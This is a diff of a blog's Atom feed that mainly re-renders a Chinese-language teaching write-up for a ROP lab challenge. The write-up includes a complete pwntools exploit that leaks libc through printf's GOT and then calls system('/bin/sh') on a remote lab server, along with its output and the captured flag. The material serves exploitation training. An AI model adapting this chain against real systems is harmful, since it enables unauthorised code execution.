@@ -6,7 +6,7 @@
   <link href="https://kazma.tw/atom.xml" rel="self"/>
   
   <link href="https://kazma.tw/"/>
-  <updated>2024-08-04T17:21:15.367Z</updated>
+  <updated>2024-08-04T17:33:07.127Z</updated>
   <id>https://kazma.tw/</id>
   
   <author>
@@ -21,9 +21,9 @@
     <link href="https://kazma.tw/2024/08/03/LYS-Rop-lab-rop3-Writeup/"/>
     <id>https://kazma.tw/2024/08/03/LYS-Rop-lab-rop3-Writeup/</id>
     <published>2024-08-03T09:35:20.484Z</published>
-    <updated>2024-08-04T17:21:15.367Z</updated>
+    <updated>2024-08-04T17:33:07.127Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="lab-rop3"><a href="#lab-rop3" class="headerlink" title="lab_rop3"></a>lab_rop3</h1><p>這次藉著到 AIS3 當助教的緣故順便跟 <a class="link"   href="https://curious-lucifer.netlify.app/" >Curious <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 一起把 LYS ROP 系列課程的 lab 整理到了部落格，也方便給學員參考。<br>那因為是一系列的 lab，所以接下來只會主要講跟上個版本的差異</p><h2 id="Diff-Exploitation"><a href="#Diff-Exploitation" class="headerlink" title="Diff &amp; Exploitation"></a>Diff &amp; Exploitation</h2><p>那這次基本上程式碼都跟上次一樣，只不過 <code>file</code> 會發現這次程式是動態的，所以 gadget 會少很多，但我們可以先用 ret2plt 來 leak 出 libc_base，可以透過呼叫 <code>printf(某個 got)</code> 然後減掉特定的 offset 來算出來。那有了 libc_base 之後我們就可以透過 return 回 main 讓程式跳回 main 重新開始執行，那接下來就沒什麼特別的，ret2libc 呼叫 <code>system(&#39;/bin/sh&#39;)</code> 就可以成功 RCE 了。</p><h2 id="Patchelf"><a href="#Patchelf" class="headerlink" title="Patchelf"></a>Patchelf</h2><p>那因為這題需要 ret2libc 所以我們需要先把題目的 libc patch 上去，可以參考下面這篇：<br><a href="https://kazma.tw/2024/04/19/Patchelf-Glibc-all-in-one-Combo/">https://kazma.tw/2024/04/19/Patchelf-Glibc-all-in-one-Combo/</a><br>首先我們看一下他 libc 版本：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">└─$ strings ../libc.so.6 | grep GNU</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.4) stable release version 2.35.</span><br><span class="line">Compiled by GNU CC version 11.4.0.</span><br><span class="line"></span><br><span class="line">└─$ <span class="built_in">cd</span> glibc-all-in-one/</span><br><span class="line">└─$ ./update_list</span><br><span class="line">[+] Common list has been save to <span class="string">&quot;list&quot;</span></span><br><span class="line">[+] Old-release list has been save to <span class="string">&quot;old_list&quot;</span></span><br></pre></td></tr></table></figure></div><p>list 找不到一樣的只好自己抓：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─$ wget http://launchpadlibrarian.net/689665881/libc6_2.35-0ubuntu3.4_amd64.deb</span><br><span class="line">└─$ ./extract debs/libc6_2.35-0ubuntu3.4_amd64.deb libs/2.35-0ubuntu3.4</span><br><span class="line"><span class="comment"># 比對後確定是同一個</span></span><br><span class="line">└─$ file ~/lys_rop/libc.so.6</span><br><span class="line">/home/kazma/lys_rop/libc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a43bfc8428df6623cd498c9c0caeb91aec9be4f9, <span class="keyword">for</span> GNU/Linux 3.2.0, stripped</span><br><span class="line"></span><br><span class="line">┌──(kazma㉿kali)-[~/glibc-all-in-one/libs/2.35-0ubuntu3.4]</span><br><span class="line">└─$ file libc.so.6</span><br><span class="line">libc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a43bfc8428df6623cd498c9c0caeb91aec9be4f9, <span class="keyword">for</span> GNU/Linux 3.2.0, stripped</span><br></pre></td></tr></table></figure></div><p>放一下關鍵步驟：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ patchelf --set-interpreter ../ld-linux-x86-64.so.2 rop3</span><br><span class="line">└─$ patchelf --replace-needed libc.so.6 ../libc.so.6 rop3</span><br></pre></td></tr></table></figure></div><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment"># r = process(&quot;./rop3&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;35.229.243.81&quot;</span>, <span class="number">10103</span>)</span><br><span class="line">l = ELF(<span class="string">&quot;../libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4011F9</span></span><br><span class="line">ret = <span class="number">0x40101A</span></span><br><span class="line">printf_plt = <span class="number">0x401060</span></span><br><span class="line">printf_got = <span class="number">0x404018</span></span><br><span class="line">main = <span class="number">0x4011FE</span></span><br><span class="line">name = <span class="number">0x404060</span></span><br><span class="line"></span><br><span class="line">p1 = flat(</span><br><span class="line">    <span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span>,</span><br><span class="line">    ret,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    printf_got,</span><br><span class="line">    printf_plt,</span><br><span class="line">    ret,</span><br><span class="line">    main,</span><br><span class="line">)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;?&quot;</span>, <span class="string">b&quot; &quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;:&quot;</span>, p1)</span><br><span class="line">r.recv(<span class="number">5</span>)</span><br><span class="line">l.address = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>)) - <span class="number">0x606F0</span></span><br><span class="line"><span class="built_in">print</span>(l.address)</span><br><span class="line">success(<span class="string">&quot;libc_base -&gt; %s&quot;</span> % <span class="built_in">hex</span>(l.address))</span><br><span class="line"></span><br><span class="line">p2 = flat(<span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span>, pop_rdi, <span class="built_in">next</span>(l.search(<span class="string">&quot;/bin/sh\0&quot;</span>)), ret, l.sym.system)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;?&quot;</span>, <span class="string">b&quot; &quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;:&quot;</span>, p2)</span><br><span class="line">r.sendline(<span class="string">&quot;cat /home/chal/flag*&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><p>└─$ python exploit.py<br>[+] Opening connection to 35.229.243.81 on port 10103: Done<br>[<em>] ‘&#x2F;home&#x2F;kazma&#x2F;lys_rop&#x2F;libc.so.6’<br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br>140181073612800<br>[+] libc_base -&gt; 0x7f7e7318d000<br>[</em>] Switching to interactive mode<br> FLAG{03cd43f4c45388e27a5de583b0e56a94}$</p><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
+    <content type="html"><![CDATA[<h1 id="lab-rop3"><a href="#lab-rop3" class="headerlink" title="lab_rop3"></a>lab_rop3</h1><p>這次藉著到 AIS3 當助教的緣故順便跟 <a class="link"   href="https://curious-lucifer.netlify.app/" >Curious <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 一起把 LYS ROP 系列課程的 lab 整理到了部落格，也方便給學員參考。<br>那因為是一系列的 lab，所以接下來只會主要講跟上個版本的差異</p><h2 id="Diff-Exploitation"><a href="#Diff-Exploitation" class="headerlink" title="Diff &amp; Exploitation"></a>Diff &amp; Exploitation</h2><p>那這次基本上程式碼都跟上次一樣，只不過 <code>file</code> 會發現這次程式是動態的，所以 gadget 會少很多，但我們可以先用 ret2plt 來 leak 出 libc_base，可以透過呼叫 <code>printf(某個 got)</code> 然後減掉特定的 offset 來算出來。那有了 libc_base 之後我們就可以透過 return 回 main 讓程式跳回 main 重新開始執行，那接下來就沒什麼特別的，ret2libc 呼叫 <code>system(&#39;/bin/sh&#39;)</code> 就可以成功 RCE 了。</p><h2 id="Patchelf"><a href="#Patchelf" class="headerlink" title="Patchelf"></a>Patchelf</h2><p>那因為這題需要 ret2libc 所以我們需要先把題目的 libc patch 上去，可以參考下面這篇：<br><a href="https://kazma.tw/2024/04/19/Patchelf-Glibc-all-in-one-Combo/">https://kazma.tw/2024/04/19/Patchelf-Glibc-all-in-one-Combo/</a><br>首先我們看一下他 libc 版本：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">└─$ strings ../libc.so.6 | grep GNU</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.4) stable release version 2.35.</span><br><span class="line">Compiled by GNU CC version 11.4.0.</span><br><span class="line"></span><br><span class="line">└─$ <span class="built_in">cd</span> glibc-all-in-one/</span><br><span class="line">└─$ ./update_list</span><br><span class="line">[+] Common list has been save to <span class="string">&quot;list&quot;</span></span><br><span class="line">[+] Old-release list has been save to <span class="string">&quot;old_list&quot;</span></span><br></pre></td></tr></table></figure></div><p>list 找不到一樣的只好自己抓：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─$ wget http://launchpadlibrarian.net/689665881/libc6_2.35-0ubuntu3.4_amd64.deb</span><br><span class="line">└─$ ./extract debs/libc6_2.35-0ubuntu3.4_amd64.deb libs/2.35-0ubuntu3.4</span><br><span class="line"><span class="comment"># 比對後確定是同一個</span></span><br><span class="line">└─$ file ~/lys_rop/libc.so.6</span><br><span class="line">/home/kazma/lys_rop/libc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a43bfc8428df6623cd498c9c0caeb91aec9be4f9, <span class="keyword">for</span> GNU/Linux 3.2.0, stripped</span><br><span class="line"></span><br><span class="line">┌──(kazma㉿kali)-[~/glibc-all-in-one/libs/2.35-0ubuntu3.4]</span><br><span class="line">└─$ file libc.so.6</span><br><span class="line">libc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a43bfc8428df6623cd498c9c0caeb91aec9be4f9, <span class="keyword">for</span> GNU/Linux 3.2.0, stripped</span><br></pre></td></tr></table></figure></div><p>放一下關鍵步驟：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ patchelf --set-interpreter ../ld-linux-x86-64.so.2 rop3</span><br><span class="line">└─$ patchelf --replace-needed libc.so.6 ../libc.so.6 rop3</span><br></pre></td></tr></table></figure></div><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment"># r = process(&quot;./rop3&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;35.229.243.81&quot;</span>, <span class="number">10103</span>)</span><br><span class="line">l = ELF(<span class="string">&quot;../libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4011F9</span></span><br><span class="line">ret = <span class="number">0x40101A</span></span><br><span class="line">printf_plt = <span class="number">0x401060</span></span><br><span class="line">printf_got = <span class="number">0x404018</span></span><br><span class="line">main = <span class="number">0x4011FE</span></span><br><span class="line">name = <span class="number">0x404060</span></span><br><span class="line"></span><br><span class="line">p1 = flat(</span><br><span class="line">    <span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span>,</span><br><span class="line">    ret,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    printf_got,</span><br><span class="line">    printf_plt,</span><br><span class="line">    ret,</span><br><span class="line">    main,</span><br><span class="line">)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;?&quot;</span>, <span class="string">b&quot; &quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;:&quot;</span>, p1)</span><br><span class="line">r.recv(<span class="number">5</span>)</span><br><span class="line">l.address = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>)) - <span class="number">0x606F0</span></span><br><span class="line"><span class="built_in">print</span>(l.address)</span><br><span class="line">success(<span class="string">&quot;libc_base -&gt; %s&quot;</span> % <span class="built_in">hex</span>(l.address))</span><br><span class="line"></span><br><span class="line">p2 = flat(<span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span>, pop_rdi, <span class="built_in">next</span>(l.search(<span class="string">&quot;/bin/sh\0&quot;</span>)), ret, l.sym.system)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;?&quot;</span>, <span class="string">b&quot; &quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;:&quot;</span>, p2)</span><br><span class="line">r.sendline(<span class="string">&quot;cat /home/chal/flag*&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[+] Opening connection to 35.229.243.81 on port 10103: Done</span><br><span class="line">[*] <span class="string">&#x27;/home/kazma/lys_rop/libc.so.6&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">140181073612800</span><br><span class="line">[+] libc_base -&gt; 0x7f7e7318d000</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> FLAG&#123;03cd43f4c45388e27a5de583b0e56a94&#125;$</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
     
     
       
@@ -34,13 +34,13 @@
     
     
     
+    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
     <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="rop" scheme="https://kazma.tw/tags/rop/"/>
     
     <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
-    
-    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
     <category term="migration" scheme="https://kazma.tw/tags/migration/"/>
     
@@ -66,13 +66,13 @@
     
     
     
+    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
     <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="rop" scheme="https://kazma.tw/tags/rop/"/>
     
     <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
-    
-    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
     <category term="migration" scheme="https://kazma.tw/tags/migration/"/>
     
@@ -96,9 +96,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="shellcode" scheme="https://kazma.tw/tags/shellcode/"/>
     
@@ -124,11 +124,11 @@
     
     
     
+    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
     <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="rop" scheme="https://kazma.tw/tags/rop/"/>
-    
-    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
     <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
     
@@ -154,9 +154,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
     
@@ -186,9 +186,9 @@
     
     
     
-    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
-    
     <category term="tools" scheme="https://kazma.tw/tags/tools/"/>
+    
+    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
     <category term="angr" scheme="https://kazma.tw/tags/angr/"/>
     
@@ -264,9 +264,9 @@
     
     
     
-    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
-    
     <category term="tools" scheme="https://kazma.tw/tags/tools/"/>
+    
+    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
     <category term="angr" scheme="https://kazma.tw/tags/angr/"/>
     
@@ -290,9 +290,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
     
@@ -320,9 +320,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="tools" scheme="https://kazma.tw/tags/tools/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="notes" scheme="https://kazma.tw/tags/notes/"/>
     
@@ -374,11 +374,11 @@
     
     
     
+    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
     <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="rop" scheme="https://kazma.tw/tags/rop/"/>
-    
-    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
     <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
     
@@ -405,9 +405,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="tools" scheme="https://kazma.tw/tags/tools/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="notes" scheme="https://kazma.tw/tags/notes/"/>
     
@@ -431,9 +431,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
     
@@ -459,9 +459,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
     
@@ -487,11 +487,11 @@
     
     
     
+    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
     <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
-    
-    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
     <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
     
@@ -515,11 +515,11 @@
     
     
     
+    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
     <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
-    
-    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
     <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
     
@@ -543,11 +543,11 @@
     
     
     
+    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
     <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
-    
-    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
     <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
     
@@ -571,11 +571,11 @@
     
     
     
+    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
     <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
-    
-    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
     <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
     
